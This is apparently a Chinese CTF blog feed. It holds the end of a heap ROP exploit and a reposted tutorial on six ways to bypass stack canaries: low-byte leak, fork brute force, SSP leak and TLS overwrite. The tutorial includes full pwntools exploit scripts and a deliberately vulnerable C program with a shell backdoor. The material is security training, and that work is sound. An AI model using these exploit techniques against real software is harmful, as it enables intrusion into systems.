p64(write)<br>log.info(<span class="hljs-string">&quot;orw rop len is: &quot;</span> + <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(rop)))<br>add(<span class="hljs-number">0x48</span>)<br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">9</span><br>edit(payload)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>	add(<span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">0x18</span>)<br>edit(p64(heap_addr + <span class="hljs-number">0x50</span>))<br>add(<span class="hljs-number">0x38</span>)<br>payload = p64(free_hook) + p64(flag_addr) + p64(heap_addr + <span class="hljs-number">0x2000</span>)<br>payload += p64(heap_addr + <span class="hljs-number">0x20A0</span>) + p64(rop_addr) + p64(rop_addr+<span class="hljs-number">0x50</span>) + p64(<span class="hljs-number">0</span>)<br>edit(payload)<br>add(<span class="hljs-number">0x10</span>)<br>edit(p64(setcontext))<br>add(<span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-string">&quot;./flag\x00&quot;</span>)<br>add(<span class="hljs-number">0x40</span>)<br>edit(p64(rop_addr) + p64(ret))<br>add(<span class="hljs-number">0x50</span>)<br>edit(rop[:<span class="hljs-number">0x50</span>])<br>add(<span class="hljs-number">0x60</span>)<br>edit(rop[<span class="hljs-number">0x50</span>:])<br>add(<span class="hljs-number">0x30</span>)<br>free()<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>由于其他的题目我还未彻底学会，所以这里贴上大佬的博客，里面有其他题目的wp：</p>
<p><a href="https://blog.csdn.net/A951860555/article/details/116910945?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/A951860555/article/details/116910945?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&amp;spm=1001.2101.3001.4242</a></p>
<p><a href="https://nuoye-blog.github.io/2021/05/16/466a7375/">https://nuoye-blog.github.io/2021/05/16/466a7375/</a></p>
]]></content>
      <tags>
        <tag>CISCN</tag>
      </tags>
  </entry>
  <entry>
    <title>canary合集——转载</title>
    <url>/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/</url>
    <content><![CDATA[<h1 id="转载自N神博客"><a href="#转载自N神博客" class="headerlink" title="转载自N神博客"></a>转载自<a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#more">N神博客</a></h1><h1 id="Canary介绍"><a href="#Canary介绍" class="headerlink" title="Canary介绍"></a>Canary介绍</h1><figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">Canary中文意译为金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警<br></code></pre></td></tr></table></figure>

<p>那么，我们可以简单把它理解成一个类似于cookie之类的东西，程序执行时需要验证它是正确的才能正常向下执行<br>通常的栈溢出利用，需要覆盖返回地址以控制程序流，那么只需要在覆盖返回地址之前插入一个叫Canary的cookie信息，当函数返回之时检测Canary的值是否被更改，就可以判断是否发生了栈溢出这种危险行为，如果Canary被更改，程序会去执行__stack_chk_fail函数并结束。<br>一般来说，canary大部分情况都是在rbp-0x8的位置<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/1.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/1-1622104561265.png"><span class="image-caption">img</span></a><br>栈中的canary大概长这样<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/2.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/2.png"><span class="image-caption">img</span></a></p>
<h2 id="覆盖低字节泄露Canary"><a href="#覆盖低字节泄露Canary" class="headerlink" title="覆盖低字节泄露Canary"></a>覆盖低字节泄露Canary</h2><p>有些存在溢出漏洞的程序，在要求我们输入字符后，会将我们输入的字符打印出来，而canary的最低位是\x00，是为了让canary可以截断输入的字符。我们可以利用溢出，多覆盖一个字节，将\x00给覆盖掉，那么canary就会和我们输入的字符连起来，那么，程序打印时没有检查打印字符的长度的话，就可以连带着Canary打印出来了，然后再次溢出，将泄露出的canary填入原来的位置，就可以覆盖到返回地址了</p>
<h3 id="例题：攻防世界-厦门邀请赛pwn1"><a href="#例题：攻防世界-厦门邀请赛pwn1" class="headerlink" title="例题：攻防世界_厦门邀请赛pwn1"></a>例题：攻防世界_厦门邀请赛pwn1</h3><p>分析下代码<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/3.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/3.png"><span class="image-caption">img</span></a><br>存在栈溢出，canary在rbp-0x8的位置，可以将输入的字符串打印出来<br>那思路就很明确了<br>先通过多写1字节将\x00覆盖，然后打印泄露Canary，最后直接ROP<br>覆盖完大概长这样<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/4.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/4.png"><span class="image-caption">img</span></a></p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-attribute">from</span> pwn import*<br><span class="hljs-attribute">from</span> LibcSearcher import *<br><span class="hljs-attribute">context</span>.log_level = &#x27;debug&#x27;<br><span class="hljs-attribute">context</span>.terminal =<span class="hljs-meta"> [&#x27;terminator&#x27;,&#x27;-x&#x27;,&#x27;sh&#x27;,&#x27;-c&#x27;]</span><br><span class="hljs-attribute">binary</span> = &#x27;./babystack&#x27;<br><span class="hljs-attribute">local</span> = <span class="hljs-number">1</span><br><span class="hljs-attribute">if</span> local == <span class="hljs-number">1</span>:<br>    <span class="hljs-attribute">p</span>=process(binary)<br><span class="hljs-attribute">else</span>:<br>    <span class="hljs-attribute">p</span>=remote(<span class="hljs-string">&quot;&quot;</span>,)<br><span class="hljs-attribute">elf</span>=ELF(binary)<br><span class="hljs-attribute">libc</span>=ELF(&#x27;/lib/x<span class="hljs-number">86</span>_<span class="hljs-number">64</span>-linux-gnu/libc.so.<span class="hljs-number">6</span>&#x27;)<br><span class="hljs-attribute">pop_rdi_ret</span> = <span class="hljs-number">0</span>x<span class="hljs-number">0000000000400</span>a<span class="hljs-number">93</span><br><span class="hljs-attribute">puts_got</span> = elf.got[&#x27;puts&#x27;]<br><span class="hljs-attribute">puts_plt</span> = elf.plt[&#x27;puts&#x27;]<br><span class="hljs-attribute">start</span> = <span class="hljs-number">0</span>x<span class="hljs-number">0000000000400720</span><br><span class="hljs-attribute">def</span> exp():<br>    <span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0</span>x<span class="hljs-number">88</span><br>    <span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>)<br>    <span class="hljs-attribute">p</span>.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    <span class="hljs-attribute">p</span>.sendline(payload)<br>    <span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>)<br>    <span class="hljs-attribute">p</span>.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    <span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0</span>x<span class="hljs-number">88</span> + &#x27;\n&#x27;)<br>    <span class="hljs-attribute">canary</span> = u<span class="hljs-number">64</span>(p.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>, &#x27;\x<span class="hljs-number">00</span>&#x27;))<br>    <span class="hljs-attribute">log</span>.success(<span class="hljs-string">&quot;canary==&gt;&quot;</span> + hex(canary))<br>    <span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0</span>x<span class="hljs-number">88</span> + p<span class="hljs-number">64</span>(canary) + <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">8</span> + p<span class="hljs-number">64</span>(pop_rdi_ret) + p<span class="hljs-number">64</span>(puts_got) + p<span class="hljs-number">64</span>(puts_plt) + p<span class="hljs-number">64</span>(start)<br>    <span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>)<br>    <span class="hljs-attribute">p</span>.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    <span class="hljs-attribute">p</span>.sendline(payload)<br>    <span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>)<br>    <span class="hljs-attribute">p</span>.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    <span class="hljs-attribute">puts_addr</span> = u<span class="hljs-number">64</span>(p.recvuntil(&#x27;\x<span class="hljs-number">7</span>f&#x27;)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,&#x27;\x<span class="hljs-number">00</span>&#x27;))<br>    <span class="hljs-attribute">libc_base</span> = puts_addr - libc.sym[&#x27;puts&#x27;]<br>    <span class="hljs-attribute">log</span>.success(<span class="hljs-string">&quot;puts_addr==&gt;&quot;</span> + hex(puts_addr))<br>    <span class="hljs-attribute">log</span>.success(<span class="hljs-string">&quot;libc_base==&gt;&quot;</span> + hex(libc_base))<br>    <span class="hljs-attribute">one_gadget</span> = libc_base + <span class="hljs-number">0</span>xf<span class="hljs-number">1207</span><br>    <span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0</span>x<span class="hljs-number">88</span> + p<span class="hljs-number">64</span>(canary) + <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">8</span> + p<span class="hljs-number">64</span>(one_gadget)<br>    <span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>)<br>    <span class="hljs-attribute">p</span>.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    <span class="hljs-attribute">p</span>.send(payload)<br>    <span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>)<br>    <span class="hljs-attribute">p</span>.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    <span class="hljs-attribute">p</span>.interactive()<br><span class="hljs-attribute">exp</span>()<br></code></pre></td></tr></table></figure>

<h2 id="Fork子进程程序爆破canary"><a href="#Fork子进程程序爆破canary" class="headerlink" title="Fork子进程程序爆破canary"></a>Fork子进程程序爆破canary</h2><p>Fork函数创建子进程相当于复制一份当前进程，并且其中的内存布局以及变量等，包括canary都与父进程一致<br>那么每次程序挂了，都相当于会再重新开始一遍<br>那我们可以逐位爆破canary，如果程序挂了就说明这一位不对，如果程序正常就可以接着跑下一位，直到爆破出正确的canary</p>
<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>这基本上都是直接从veritas👴👴的blog里摘出来的</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">backdoor</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">setbuf</span>(stdin, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">setbuf</span>(stderr, <span class="hljs-literal">NULL</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">vul</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">100</span>];<br>    <span class="hljs-built_in">read</span>(STDIN_FILENO, buffer, <span class="hljs-number">120</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-built_in">init</span>();<br>	<span class="hljs-keyword">pid_t</span> pid;<br>	<span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) &#123;<br>		pid = fork();<br>		<span class="hljs-keyword">if</span>(pid &lt; <span class="hljs-number">0</span>) &#123;<br>			<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;fork error&quot;</span>);<br>			<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>		&#125;<br>		<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>) &#123;<br>			<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;welcome&quot;</span>);<br>			<span class="hljs-built_in">vul</span>();<br>			<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;recv sucess&quot;</span>);<br>		&#125;<br>		<span class="hljs-keyword">else</span> &#123;<br>			<span class="hljs-built_in">wait</span>(<span class="hljs-number">0</span>);<br>		&#125;<br>	&#125;<br>&#125;<br><span class="hljs-comment">//gcc main.c -m32 -o bin</span><br></code></pre></td></tr></table></figure>

<p>然后就硬爆破</p>
<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> pwn import *<br>p = <span class="hljs-built_in">process</span>(<span class="hljs-string">&#x27;./bin&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./bin&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;welcome\n&#x27;</span>)<br>canary = <span class="hljs-string">&#x27;\x00&#x27;</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0x100</span>):<br>        p.<span class="hljs-built_in">send</span>(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">100</span> + canary + chr(i))<br>        <span class="hljs-keyword">a</span> = p.recvuntil(<span class="hljs-string">&#x27;welcome\n&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;recv&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">a</span>:<br>            canary += chr(i)<br>            break<br><br>p.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">100</span> + canary + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">12</span> + p32(<span class="hljs-number">0x80485FB</span>))<br>p.sendline(<span class="hljs-string">&quot;cat flag&quot;</span>)<br>flag = p.recv()<br>p.<span class="hljs-built_in">close</span>()<br><span class="hljs-built_in">log</span>.success(<span class="hljs-string">&#x27;key is:&#x27;</span> + flag)<br><span class="hljs-comment">#  [*] Stopped process &#x27;./bin&#x27; (pid 17747)</span><br><span class="hljs-comment">#  [+] key is:flag&#123;test&#125;</span><br></code></pre></td></tr></table></figure>

<h2 id="SSP-Stack-Smashing-Protect-Leak"><a href="#SSP-Stack-Smashing-Protect-Leak" class="headerlink" title="SSP(Stack Smashing Protect) Leak"></a>SSP(Stack Smashing Protect) Leak</h2><p>这个方法不能getshell，但是可以通过触发canary时的报错信息，来打印出我们想要的内存中的值，例如flag<br>触发canary时会去执行_stack_chk_fail函数，执行这个函数时，会在屏幕上打印这么一段信息<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/7.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/7.png"><span class="image-caption">img</span></a><br>我们分析下__stack_chk_fail的源码<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/5.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/5.png"><span class="image-caption">img</span></a><br>他会调用一个__fortify_fail函数并传入”stack smashing detected”字符串<br>我们接着分析__fortify_fail函数<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/6.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/6.png"><span class="image-caption">img</span></a><br>此处，第一个%s的参数是msg，第二个参数需要判断，如果msg!=NULL，就打印__libc_argv[0]，否则打印”<unknown>”，而argv[0]存储的就是程序名，且这个参数存于栈上，我们只要修改栈上的argv[0]指针为flag的地址，就可以打印出flag</unknown></p>
<h3 id="例题：wdb2018-guess"><a href="#例题：wdb2018-guess" class="headerlink" title="例题：wdb2018_guess"></a>例题：wdb2018_guess</h3><p>分析main函数</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><code class="hljs reasonml">__int64 __fastcall main(__int64 a1, <span class="hljs-built_in">char</span> **a2, <span class="hljs-built_in">char</span> **a3)<br>&#123;<br>  __WAIT_STATUS stat_loc; <span class="hljs-comment">// [rsp+14h] [rbp-8Ch]</span><br>  <span class="hljs-built_in">int</span> v5; <span class="hljs-comment">// [rsp+1Ch] [rbp-84h]</span><br>  __int64 v6; <span class="hljs-comment">// [rsp+20h] [rbp-80h]</span><br>  __int64 v7; <span class="hljs-comment">// [rsp+28h] [rbp-78h]</span><br>  <span class="hljs-built_in">char</span> buf<span class="hljs-literal">[<span class="hljs-number">48</span>]</span>; <span class="hljs-comment">// [rsp+30h] [rbp-70h]</span><br>  <span class="hljs-built_in">char</span> s2<span class="hljs-literal">[<span class="hljs-number">56</span>]</span>; <span class="hljs-comment">// [rsp+60h] [rbp-40h]</span><br>  unsigned __int64 v10; <span class="hljs-comment">// [rsp+98h] [rbp-8h]</span><br><br>  v10 = <span class="hljs-constructor">__readfsqword(0x28u)</span>;<br>  v7 = <span class="hljs-number">3L</span>L;<br>  <span class="hljs-constructor">LODWORD(<span class="hljs-params">stat_loc</span>.<span class="hljs-params">__uptr</span>)</span> = <span class="hljs-number">0</span>;<br>  v6 = <span class="hljs-number">0L</span>L;<br>  sub<span class="hljs-constructor">_4009A6()</span>;<br>  <span class="hljs-constructor">HIDWORD(<span class="hljs-params">stat_loc</span>.<span class="hljs-params">__iptr</span>)</span> = <span class="hljs-keyword">open</span>(<span class="hljs-string">&quot;./flag.txt&quot;</span>, <span class="hljs-number">0</span>, a2);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-constructor">HIDWORD(<span class="hljs-params">stat_loc</span>.<span class="hljs-params">__iptr</span>)</span><span class="hljs-operator"> == </span>-<span class="hljs-number">1</span> )<br>  &#123;<br>    perror(<span class="hljs-string">&quot;./flag.txt&quot;</span>);<br>    <span class="hljs-constructor">_exit(-1)</span>;<br>  &#125;<br>  read(<span class="hljs-constructor">SHIDWORD(<span class="hljs-params">stat_loc</span>.<span class="hljs-params">__iptr</span>)</span>, buf, <span class="hljs-number">0x30</span>uLL);<br>  close(<span class="hljs-constructor">SHIDWORD(<span class="hljs-params">stat_loc</span>.<span class="hljs-params">__iptr</span>)</span>);<br>  puts(<span class="hljs-string">&quot;This is GUESS FLAG CHALLENGE!&quot;</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( v6 &gt;= v7 )<br>    &#123;<br>      puts(<span class="hljs-string">&quot;you have no sense... bye :-) &quot;</span>);<br>      return <span class="hljs-number">0L</span>L;<br>    &#125;<br>    v5 = sub<span class="hljs-constructor">_400A11()</span>;<br>    <span class="hljs-keyword">if</span> ( !v5 )<br>      break;<br>    ++v6;<br>    wait((__WAIT_STATUS)&amp;stat_loc);<br>  &#125;<br>  puts(<span class="hljs-string">&quot;Please type your guessing flag&quot;</span>);<br>  gets(s2);<br>  <span class="hljs-keyword">if</span> ( !strcmp(buf, s2) )<br>    puts(<span class="hljs-string">&quot;You must have great six sense!!!! :-o &quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    puts(<span class="hljs-string">&quot;You should take more effort to get six sence, and one more challenge!!&quot;</span>);<br>  return <span class="hljs-number">0L</span>L;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>sub_400A11函数</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><code class="hljs mipsasm">__int64 <span class="hljs-keyword">sub_400A11()</span><br><span class="hljs-keyword"></span>&#123;<br>  unsigned int <span class="hljs-built_in">v1</span><span class="hljs-comment">; // [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">v1</span> = fork();<br>  if ( <span class="hljs-built_in">v1</span> == -<span class="hljs-number">1</span> )<br>    err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;can not fork&quot;</span>);<br>  return <span class="hljs-built_in">v1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以看到，fork了一个子进程，并且判断依据是v7的大小，也就是说整个程序可以崩溃3次<br>这姿势和题目我专门写了一篇，思路可以直接看<a href="https://n0vice.top/2020/04/09/Stack-smash/">stack smash</a></p>
<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight autoit"><table><tr><td class="code"><pre><code class="hljs autoit"><span class="hljs-meta">#!/usr/bin/env python</span><br><span class="hljs-meta">#coding=utf-8</span><br>from pwn import*<br>import sys<br><span class="hljs-meta">#context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span></span><br>context.terminal = [<span class="hljs-string">&#x27;terminator&#x27;</span>,<span class="hljs-string">&#x27;-x&#x27;</span>,<span class="hljs-string">&#x27;sh&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>]<br><span class="hljs-built_in">binary</span> = <span class="hljs-string">&#x27;./pwn1&#x27;</span> <br><span class="hljs-keyword">local</span> = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">local</span> == <span class="hljs-number">1</span>:<br>    p=process(<span class="hljs-built_in">binary</span>)<br><span class="hljs-keyword">else</span>:<br>    p=remote(<span class="hljs-string">&quot;&quot;</span>,)<br>elf=ELF(<span class="hljs-built_in">binary</span>)<br>libc=elf.libc<br>def <span class="hljs-built_in">exp</span>():<br>    p.recvuntil(<span class="hljs-string">&quot;flag\n&quot;</span>)<br>    payload = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">296</span> + p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>    p.sendline(payload)<br>    p.recvuntil(<span class="hljs-string">&quot;*** stack smashing detected ***: &quot;</span>)<br>    puts_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[<span class="hljs-number">-6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>    libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>    <span class="hljs-built_in">log</span>.success(<span class="hljs-string">&quot;puts_addr==&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(puts_addr))<br>    <span class="hljs-built_in">log</span>.success(<span class="hljs-string">&quot;libc_base==&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>    environ = libc_base + libc.sym[<span class="hljs-string">&#x27;environ&#x27;</span>]<br>    p.recvuntil(<span class="hljs-string">&quot;flag\n&quot;</span>)<br>    payload = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">296</span> + p64(environ)<br>    p.sendline(payload)<br>    p.recvuntil(<span class="hljs-string">&quot;*** stack smashing detected ***: &quot;</span>)<br>    stack_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[<span class="hljs-number">-6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>    <span class="hljs-built_in">log</span>.success(<span class="hljs-string">&quot;stack_addr==&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(stack_addr))<br>    flag = stack_addr - <span class="hljs-number">0x168</span><br>    p.recvuntil(<span class="hljs-string">&quot;flag\n&quot;</span>)<br>    payload = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">296</span> + p64(flag)<br>    p.sendline(payload)<br>    p.interactive()<br><span class="hljs-built_in">exp</span>()<br></code></pre></td></tr></table></figure>

<h4 id="warn"><a href="#warn" class="headerlink" title="warn"></a>warn</h4><p>需要注意的是，这个方法在glibc2.27及以上的版本中已失效<br>我们继续分析2.27的源码<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/8.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/8.png"><span class="image-caption">img</span></a><br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/9.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/9.png"><span class="image-caption">img</span></a><br>可以看到，执行__fortify_fail_abort函数时多传入了一个need_backtrace参数，而整个参数在前面就已经写死成false了，所以执行__libc_message函数时，第二个参数也被写死成了”<unknown>”字符串，打印不了栈中的信息了</unknown></p>
<h2 id="修改TLS结构体"><a href="#修改TLS结构体" class="headerlink" title="修改TLS结构体"></a>修改TLS结构体</h2><p>我们首先需要知道canary是从<strong>哪里</strong></p>
<p>被取出来的<br>随便查看一个64位的程序，可以看到是从fs指向的位置加上0x28偏移的位置取出来的<br>而初始化canary时，fs寄存器指向的位置就是TLS结构体<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/11.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/11.png"><span class="image-caption">img</span></a><br>这个被定义在glibc/sysdeps/x86_64/nptl/tls.h中结构体tcbhead_t就是用来描述TLS的<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/12.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/12.png"><span class="image-caption">img</span></a><br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/13.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/13.png"><span class="image-caption">img</span></a><br>以上是libc_start_main关于canary生成的过程，_dl_random是内核提供的随机数生成器<br>fs指向的位置加上0x28偏移处的变量uintptr_t stack_chk_guard就是canary的值</p>
<h3 id="例题：-CTF2018-babystack"><a href="#例题：-CTF2018-babystack" class="headerlink" title="例题：*CTF2018 babystack"></a>例题：*CTF2018 babystack</h3><p>分析代码<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/14.png"><img src="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/14.png"><span class="image-caption">img</span></a><br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/15.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/15.png"><span class="image-caption">img</span></a><br>程序在main函数中创建了一个子线程，并在其中调用栈溢出函数，首先输入size，然后读入size大小的字符<br>在多线程中TLS将被放置在多线程的栈的顶部，因此我们能直接通过栈溢出对canary初始值进行更改</p>
